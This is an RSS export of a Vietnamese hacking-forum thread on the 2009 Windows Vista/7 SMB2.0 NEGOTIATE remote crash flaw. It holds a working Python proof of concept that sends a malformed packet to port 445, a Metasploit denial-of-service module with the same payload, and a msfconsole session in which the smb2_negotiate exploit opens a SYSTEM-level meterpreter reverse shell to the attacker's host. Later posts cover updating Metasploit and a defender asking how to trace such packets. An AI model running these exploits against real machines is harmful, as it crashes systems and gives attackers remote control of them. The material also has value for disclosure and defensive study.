@@ -1,0 +1,456 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D."]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D."]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ =============================================
+<font color='red'>- Release date: September 7th, 2009
+- Discovered by: Laurent Gaffié
+- Severity: Medium/High</font>
+=============================================
+
+I. VULNERABILITY
+-------------------------
+
+<span class="link"> http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html</span>
+
+II. BACKGROUND
+-------------------------
+Windows vista and newer Windows comes with a new SMB version named SMB2.
+See: <span class="link"> http://en.wikipedia.org/wiki/Windows_Vista_networking_technologies#Server_Message_Block_2.0</span>
+for more details.
+
+III. DESCRIPTION
+-------------------------
+SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.
+The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used to identify the SMB dialect that will be used for futher communication.
+
+IV. PROOF OF CONCEPT
+-------------------------
+
+Smb-Bsod.py:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#!/usr/bin/python
+#When SMB2.0 recieve a &quot;&&quot; char in the &quot;Process Id High&quot; SMB header field
+#it dies with a PAGE_FAULT_IN_NONPAGED_AREA error
+
+from socket import socket
+from time import sleep
+
+host = &quot;IP_ADDR&quot;, 445
+buff = &#40;
+&quot;\x00\x00\x00\x90&quot; # Begin SMB header: Session message
+&quot;\xff\x53\x4d\x42&quot; # Server Component: SMB
+&quot;\x72\x00\x00\x00&quot; # Negociate Protocol
+&quot;\x00\x18\x53\xc8&quot; # Operation 0x18 & sub 0xc853
+&quot;\x00\x26&quot;# Process ID High: --&gt; :&#41; normal value should be &quot;\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe&quot;
+&quot;\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54&quot;
+&quot;\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31&quot;
+&quot;\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00&quot;
+&quot;\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57&quot;
+&quot;\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61&quot;
+&quot;\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c&quot;
+&quot;\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c&quot;
+&quot;\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e&quot;
+&quot;\x30\x30\x32\x00&quot;
+&#41;
+s = socket&#40;&#41;
+s.connect&#40;host&#41;
+s.send&#40;buff&#41;
+s.close&#40;&#41;</pre>
+		</div>
+V. BUSINESS IMPACT
+-------------------------
+An attacker can remotly crash any Vista/Windows 7 machine with SMB enable.
+Windows Xp, 2k, are NOT affected as they dont have this driver.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Windows Vista/7 All (64b/32b|SP1/SP2 fully updated) and possibly Win Server 2008
+as it use the same SMB2.0 driver (but not tested).
+
+VII. SOLUTION
+-------------------------
+Vendor contacted, but no patch available for the moment.
+Close SMB feature and ports, until a patch is provided.
+
+VIII. REFERENCES
+-------------------------<span class="link"> http://microsoft.com</span>
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Laurent Gaffié
+Laurent.gaffie{remove-this}(at)gmail.com
+
+X. REVISION HISTORY
+-------------------------
+September 7th, 2009: Initial release
+
+
+XI. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied &quot;as-is&quot;
+with no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or
+misuse of this information. 
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192124</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192124</link>
+				<pubDate><![CDATA[Tue, 8 Sep 2009 13:50:02]]> GMT</pubDate>
+				<author><![CDATA[ holiganvn]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ http://www.reversemode.com/index.php?option=com_mamblog&Itemid=15&task=show&action=view&id=64&Itemid=15]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192166</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192166</link>
+				<pubDate><![CDATA[Tue, 8 Sep 2009 23:31:25]]> GMT</pubDate>
+				<author><![CDATA[ lamer]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ <span class="link"> http://www.quantrimang.com.vn/baomat/bao-mat/tin-bao-mat/60019_Canh_bao_ve_lo_hong_chua_va_cua_Microsoft.aspx</span>
+
+ai đang xài win vista/7 thì tạm thời tắt cái  SMB 2.0 đi 
+
+<span class="link"> http://www.petri.co.il/how-to-disable-smb-2-on-windows-vista-or-server-2008.htm</span>
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192247</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192247</link>
+				<pubDate><![CDATA[Wed, 9 Sep 2009 23:26:24]]> GMT</pubDate>
+				<author><![CDATA[ holiganvn]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ mã khai thác để thêm vào metasploit:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#<span class="link"> http://metasploit.com/framework/</span>
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 &lt; Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Auxiliary:: Dos
+
+	def initialize&#40;info = {}&#41;
+		super&#40;update_info&#40;info,	
+			'Name'           =&gt; 'Windows Vista SMB 0-day DoS
+			'Description'    =&gt; %q{
+					This module exploits an &quot;unknown&quot; vulnerability in the SMB service on windows. &#40;port 445&#41; Ported by MaXe security@intern0t.net
+			},
+			'Author'         =&gt; &#91; 'MaXe, credits to: Laurent Gaffié' &#93;,
+			'License'        =&gt; MSF_LICENSE,
+			'Version'        =&gt; '$Revision$',
+			'References'     =&gt;
+				&#91;
+					&#91; 'url', 'http://pentestit.com/2009/09/08/windows-vista-smb-remote-request-day' &#93;,
+				&#93;,
+			'DisclosureDate' =&gt; 'Sep 08 2009
+			
+		register_options&#40;
+			&#91;
+				Opt::RPORT&#40;445&#41;,
+			&#93;,
+		self.class&#41;
+	end
+
+	def run
+		connect
+
+	buf1 = &quot;\x00\x00\x00\x90&quot;
+	buf2 = &quot;\xff\x53\x4d\x42&quot;
+	buf3 = &quot;\x72\x00\x00\x00&quot;
+	buf4 = &quot;\x00\x18\x53\xc8&quot;
+	buf5 = &quot;\x00\x26&quot;
+	dos =	&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe
+	\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54
+	\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31
+	\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00
+	\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57
+	\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61
+	\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c
+	\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c
+	\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e
+	\x30\x30\x32\x00&quot;
+
+
+		sploit = buf1
+		sploit &lt;&lt; buf2
+		sploit &lt;&lt; buf3
+		sploit &lt;&lt; buf4
+		sploit &lt;&lt; buf5
+		sploit &lt;&lt; dos
+
+		sock.put&#40;sploit&#41;
+
+		disconnect
+	end
+
+end</pre>
+		</div>
+
+<span class="link"> http://www.microsoft.com/technet/security/bulletin/ms08-037.mspx</span>
+
+
+<font color='orange'>This program exploits an SMB2 protocol flaw utilizing a vulnerability first discovered by Laurent Gaffié. Tested to crash MS Windows Vista SP2 and MS Windows Server 2008 R2 with file sharing enabled. This code will cause such systems to display the "Blue Screen of Death" followed by a less-than-graceful reboot.</font>
+
+<span class="link"> http://www.procyonlabs.com/software/smb2_bsoder/</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192759</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#192759</link>
+				<pubDate><![CDATA[Mon, 14 Sep 2009 17:50:24]]> GMT</pubDate>
+				<author><![CDATA[ holiganvn]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ <span class="link"> http://trac.metasploit.com/browser/framework3/trunk/modules/exploits/windows/smb/smb2_negotiate_func_index.rb</span>
+
+tấn công bằng metaploit:
+
+-------------------------------------------------------------------------
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>holiganvn@holiganvn:~$ msfconsole
+
+                |                    |      _&#41; |   
+ __ `__ \   _ \ __|  _` |  __| __ \  |  _ \  | __| 
+ |   |   |  __/ |   &#40;   |\__ \ |   | | &#40;   | | |   
+_|  _|  _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__| 
+                              _|                   
+
+
+         =&#91; msf v3.3-dev
++ -- --=&#91; 402 exploits - 248 payloads
++ -- --=&#91; 21 encoders - 8 nops
+         =&#91; 182 aux
+
+msf&gt; use exploit/windows/smb/smb2_negotiate_func_index
+msf &#40;exploit/smb2&#41; &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf &#40;exploit/smb2&#41; &gt; set LHOST 192.168.0.136
+msf &#40;exploit/smb2&#41; &gt; set LPORT 5678
+msf &#40;exploit/smb2&#41; &gt; set RHOST 192.168.0.211
+msf &#40;exploit/smb2&#41; &gt; exploit
+
+&#91;*&#93; Started reverse handler
+&#91;*&#93; Connecting to the target &#40;192.168.0.211:445&#41;...
+&#91;*&#93; Sending the exploit packet &#40;854 bytes&#41;...
+&#91;*&#93; Waiting up to 180 seconds for exploit to trigger...
+&#91;*&#93; Sending stage &#40;719360 bytes&#41;
+&#91;*&#93; Meterpreter session 2 opened &#40;192.168.0.136:5678 -&gt; 192.168.0.211:49158&#41;
+
+meterpreter &gt; sysinfo
+Computer: WIN-UAKGQGDWLX2
+OS : Windows 2008 &#40;Build 6001, Service Pack 1&#41;.
+Arch : x86
+Language: en_US
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</pre>
+		</div>
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194376</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194376</link>
+				<pubDate><![CDATA[Tue, 29 Sep 2009 14:22:35]]> GMT</pubDate>
+				<author><![CDATA[ holiganvn]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ Hi, Bro ơi, mình đọc đoạn code đó rồi nhưng ko bik dùng làm sao á? 
+<span class="link"> http://trac.metasploit.com/browser/framework3/trunk/modules/exploits/windows/smb/smb2_negotiate_func_index.rb</span>
+Mình có một số thắc mắc này nè : 
+
+- Ngôn ngữ sử dụng
+- Trình biên dịch
+
+Mình đang học tập ở HVA nhưng nhiều bài viết ko rõ ngôn ngữ và trình biên dịch như thế nào, download ở đâu nữa.
+Sau này các Bro viết bài mong các Bro lưu tâm cho những Newbie như bọn mình nhé. Thank nhiều !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194684</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194684</link>
+				<pubDate><![CDATA[Sun, 4 Oct 2009 09:06:23]]> GMT</pubDate>
+				<author><![CDATA[ lenon]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">lenon wrote:</cite><br>
+		<blockquote>Hi, Bro ơi, mình đọc đoạn code đó rồi nhưng ko bik dùng làm sao á? 
+<span class="link"> http://trac.metasploit.com/browser/framework3/trunk/modules/exploits/windows/smb/smb2_negotiate_func_index.rb</span>
+Mình có một số thắc mắc này nè : 
+
+- Ngôn ngữ sử dụng
+- Trình biên dịch
+
+Mình đang học tập ở HVA nhưng nhiều bài viết ko rõ ngôn ngữ và trình biên dịch như thế nào, download ở đâu nữa.
+Sau này các Bro viết bài mong các Bro lưu tâm cho những Newbie như bọn mình nhé. Thank nhiều !&nbsp;
+		</blockquote>
+
+@lenon: xin lỗi bạn,mấy ngày nay bão đứt dây điện thoại nên không lên mạng được :) 
+
+-- <span class="link"> http://trac.metasploit.com/browser/framework3/trunk/modules/exploits/windows/smb/smb2_negotiate_func_index.rb</span>
+
+đoạn code trên được viết bằng "ngôn ngữ lập trình ruby"
+
+<span class="link"> http://vi.wikipedia.org/wiki/Ruby_(ng%C3%B4n_ng%E1%BB%AF_l%E1%BA%ADp_tr%C3%ACnh)</span>
+
+<span class="link"> http://www.ruby-lang.org/en/</span>
+
+đoạn code trên được viết dùng để exploit lỗ hổng Windows SMB2,nó chỉ là 1 moudle được add vào metasploit để khai thác,nếu bác không biết add exploit code này,bác có thể cập nhật online cho metasploit,ví dụ(trong linux):
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>holiganvn@holiganvn:/opt$ su root
+Password: 
+root@holiganvn:/opt# cd /opt
+root@holiganvn:/opt# ls
+lampp  metasploit  nessus  ruby
+root@holiganvn:/opt# cd metasploit
+root@holiganvn:/opt/metasploit# ls
+framework3
+root@holiganvn:/opt/metasploit# cd framework3
+root@holiganvn:/opt/metasploit/framework3# ls
+data           modules     msfelfscan   msfopcode   msfrpcd  scripts
+documentation  msfcli      msfencode    msfpayload  msfweb   tools
+external       msfconsole  msfgui       msfpescan   plugins
+lib            msfd        msfmachscan  msfrpc      README
+root@holiganvn:/opt/metasploit/framework3# svn update
+....
+U    modules/exploits/windows/lpd/wincomlpd_admin.rb
+A    modules/exploits/windows/http/adobe_robohelper_authbypass.rb
+U    modules/exploits/windows/http/mdaemon_worldclient_form2raw.rb
+U    modules/exploits/windows/browser/zenturiprogramchecker_unsafe.rb
+U    modules/exploits/windows/browser/apple_quicktime_rtsp.rb
+U    modules/exploits/windows/browser/macrovision_unsafe.rb
+U    modules/exploits/windows/browser/systemrequirementslab_unsafe.rb
+U    modules/exploits/windows/browser/winzip_fileview.rb
+U    modules/exploits/windows/browser/ie_unsafe_scripting.rb
+U    modules/exploits/windows/browser/owc_spreadsheet_msdso.rb
+U    modules/exploits/windows/browser/juniper_sslvpn_ive_setupdll.rb
+U    modules/exploits/windows/browser/symantec_appstream_unsafe.rb
+A    modules/exploits/windows/browser/symantec_altirisdeployment_downloadandinstall.rb
+U    modules/exploits/windows/browser/ie_createobject.rb
+U    modules/exploits/windows/browser/ms08_041_snapshotviewer.rb
+U    modules/exploits/windows/browser/autodesk_idrop.rb
+A    modules/exploits/windows/nfs
+A    modules/exploits/windows/nfs/xlink_nfsd.rb
+U    modules/exploits/windows/fileformat/adobe_pdf_embedded_exe.rb
+A    modules/exploits/windows/fileformat/emc_appextender_keyworks.rb
+U    modules/exploits/windows/fileformat/videolan_tivo.rb
+U    modules/exploits/windows/ftp/sasser_ftpd_port.rb
+A    modules/exploits/windows/ftp/xlink_client.rb
+U    modules/exploits/windows/ftp/warftpd_165_pass.rb
+U    modules/exploits/windows/ftp/freeftpd_user.rb
+U    modules/exploits/windows/ftp/proftp_banner.rb
+U    modules/exploits/windows/ftp/warftpd_165_user.rb
+U    modules/exploits/windows/ftp/wsftp_server_503_mkd.rb
+A    modules/exploits/windows/ftp/xlink_server.rb
+U    modules/exploits/windows/driver/dlink_wifi_rates.rb
+A    modules/exploits/windows/motorola
+A    modules/exploits/windows/motorola/timbuktu_fileupload.rb
+U    modules/exploits/windows/vpn/safenet_ike_11.rb
+U    modules/exploits/windows/smb/smb_relay.rb
+U    modules/exploits/windows/smb/psexec.rb
+A    modules/exploits/windows/smb/smb2_negotiate_func_index.rb
+U    modules/exploits/windows/iis/ms01_023_printer.rb
+U    modules/exploits/windows/imap/mercury_rename.rb
+U    modules/exploits/windows/imap/mdaemon_fetch.rb
+U    modules/exploits/windows/brightstor/universal_agent.rb
+A    modules/exploits/windows/misc/bigant_server_250.rb
+U    modules/exploits/windows/misc/fb_svc_attach.rb
+U    modules/exploits/windows/misc/ib_svc_attach.rb
+A    modules/exploits/windows/misc/sap_2005_license.rb
+U    modules/exploits/windows/misc/fb_isc_create_database.rb
+U    modules/exploits/windows/misc/fb_isc_attach_database.rb
+U    modules/exploits/windows/misc/ib_isc_create_database.rb
+U    modules/exploits/windows/misc/ib_isc_attach_database.rb
+U    modules/exploits/windows/misc/videolan_tivo.rb
+U    modules/exploits/windows/misc/eiqnetworks_esa.rb
+U    modules/exploits/windows/ssh/putty_msg_debug.rb
+U    modules/exploits/windows/mssql/ms02_056_hello.rb
+U    modules/exploits/windows/oracle/tns_service_name.rb
+U    modules/exploits/windows/oracle/tns_arguments.rb
+U    modules/exploits/windows/firewall/kerio_auth.rb
+...
+Updated to revision 7123.</pre>
+		</div>
+
+trên là các exploit của windows mình đã cập nhật xong cho metasploit
+
+--chạy metaploit sau khi cập nhật xong:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root@holiganvn:~$ msfconsole
+
+                _                  _       _ _
+               | |                | |     &#40;_&#41; |
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|
+| | | | | |  __/ || &#40;_| \__ \ |_&#41; | | &#40;_&#41; | | |_
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|
+                            | |
+                            |_|
+
+
+       =&#91; msf v3.3-dev &#91;core:3.3 api:1.0&#93;
++ -- --=&#91; 412 exploits - 261 payloads
++ -- --=&#91; 21 encoders - 8 nops
+       =&#91; 191 aux</pre>
+		</div>
+
+<br>
+			<div align="center" class="limitview"><img src='http://img132.imageshack.us/img132/2235/manhnh.png' border="0" onload="maxImg(this, 500px);" /></div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194701</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#194701</link>
+				<pubDate><![CDATA[Sun, 4 Oct 2009 13:57:46]]> GMT</pubDate>
+				<author><![CDATA[ holiganvn]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ Chào các anh, cho em hỏi:
+máy công ty em có hiên tượng nó tự động gửi gói smb2 này đến server, đã xác định được máy gửi nhưng chúng em  muốn tìm ra module nào đã gửi gói tin này (xác định phần mềm tấn công) nhưng hiện tại chưa có cách nào.
+
+Cụ thể: dùng tcp mon thì cứ sau tầm 5' nó gửi gói tin 1 lần, tiến trình tìm thấy lại là system.exe =&gt; một trong các module của nó đã gửi đi.
+
+Em đã thử viết 1 driver hook TDI để lần ngược lên, nhưng đáng tiếc là gói smb này nó ko qua tầng TDI.
+
+Mong các anh có thể giới thiệu cho e 1 tool nào có thể làm được: (xem module nào đã gửi gói SMB2 này) Hoặc 1 định hướng để e tìm hiểu được không ạ.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#259642</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#259642</link>
+				<pubDate><![CDATA[Thu, 22 Mar 2012 16:31:01]]> GMT</pubDate>
+				<author><![CDATA[ totden]]></author>
+			</item>
+			<item>
+				<title>Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.</title>
+				<description><![CDATA[ Liệu nó có dùng socket để gửi gói tin đi ko nhỉ? Em tính hook socket để xem, nhưng tiến trình system thì ko thể hook được. Còn driver thì em chưa làm bao giờ.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/31164.hva#259643</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/31164.hva#259643</link>
+				<pubDate><![CDATA[Thu, 22 Mar 2012 16:33:28]]> GMT</pubDate>
+				<author><![CDATA[ totden]]></author>
+			</item>
+	</channel>
+</rss>
